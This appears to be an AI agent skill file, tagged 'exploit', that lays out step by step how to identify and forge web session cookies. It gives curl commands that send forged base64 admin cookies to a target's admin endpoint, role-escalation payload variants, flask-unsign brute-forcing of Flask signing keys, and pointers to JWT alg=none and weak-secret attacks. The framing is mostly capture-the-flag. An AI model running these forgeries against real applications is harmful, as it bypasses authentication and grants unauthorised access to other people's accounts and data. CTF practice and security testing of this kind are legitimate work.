---
name: cookie-analysis
description: "Session cookie analysis and forgery methodology. Use when a web application authenticates with cookies and you need to determine the cookie type and choose a forgery method. Covers direct forgery of unsigned base64 cookies, Flask signed cookies (brute-forcing the key with flask-unsign), and identification of encrypted/binary cookies. This skill handles cookie type triage and routing: if the cookie is a JWT (three segments starting with eyJ), switch to jwt-attack-methodology; if it is an encrypted cookie that needs a padding oracle, switch to crypto-web-attack"
zh-signals: "分析与伪造 Session Cookie，判断 cookie 类型并选择相应伪造方法，涵盖 unsigned base64、Flask 签名与加密 cookie。信号:Cookie分析,Cookie伪造,Session,Flask签名,认证绕过"
when-to-use: >-
  Use when a web application uses cookies for authentication and you need to identify
  the cookie type and choose a forgery method, routing JWT or padding-oracle cases to
  dedicated skills.
metadata:
  tags: "cookie,session,flask,base64,forgery,authentication,bypass,cookie-analysis,authentication bypass,flask-unsign,session cookie,itsdangerous,cookie forgery,unsigned cookie"
  category: "exploit"
---

# Cookie Analysis & Forgery Methodology

## When to Use
- You found a session cookie and want to forge it
- BEFORE running flask-unsign or any brute-force tool
- When you need to bypass authentication via cookie manipulation

## Step 1: Extract the cookie
```bash
curl -sI http://TARGET/ | grep -i set-cookie
```

## Step 2: Identify cookie type

### Test A: Base64 decode
```bash
echo '<cookie_value>' | base64 -d 2>/dev/null
# Also try URL-decoded version:
python3 -c "import base64,urllib.parse; print(base64.b64decode(urllib.parse.unquote('<cookie>')))"
```

**If it decodes to valid JSON** → **UNSIGNED BASE64** (most common in CTF!)
- Attack: forge directly — takes 5 seconds
```bash
# Forge admin session
echo -n '{"user_id":1}' | base64
# Use as cookie:
curl -b 'session=eyJ1c2VyX2lkIjoxfQ==' http://TARGET/admin/flag
```

- Try variations:
```bash
echo -n '{"user_id":1}' | base64
echo -n '{"role":"admin"}' | base64
echo -n '{"is_admin":true}' | base64
echo -n '{"user_id":1,"role":"admin"}' | base64
echo -n '{"username":"admin"}' | base64
```

### Test B: Flask itsdangerous signature
If the cookie has a `.` followed by a signature portion:
```bash
# Cookie looks like: eyJ...IjoxfQ.Xk2Ypg.dBV2_DkvOBP3...
flask-unsign --decode --cookie '<cookie>'
# If decode works → Flask signed cookie
flask-unsign --unsign --cookie '<cookie>' --wordlist $ABOUTSECURITY_ROOT/Dic/passwords.txt
```

### Test C: JWT
If the cookie has three base64 parts separated by `.`:
```bash
# Header.Payload.Signature
echo '<first_part>' | base64 -d  # Should show {"alg":"...","typ":"JWT"}
# → Use Skill(skill="jwt-attack-methodology")
```

### Test D: Encrypted/Binary
If base64 decode produces garbage → encrypted cookie
- Need key or padding oracle attack
- Check source code for encryption key

## Step 3: Common bypass patterns
- If unsigned: forge with user_id=1, role=admin, is_admin=true
- If Flask-signed: try common keys ('secret', app name, etc.)
- If JWT with alg=none: remove signature, set alg to "none"
- If JWT with HS256: try common secrets, check for JWKS endpoint

## Critical Reminders
- NEVER run flask-unsign on unsigned cookies — wastes 25+ minutes and ALWAYS fails
- Always decode the cookie FIRST to determine its type
- Base64 JSON cookies are the most common type in CTF challenges
- Direct forgery takes 5 seconds vs brute-forcing takes 25+ minutes
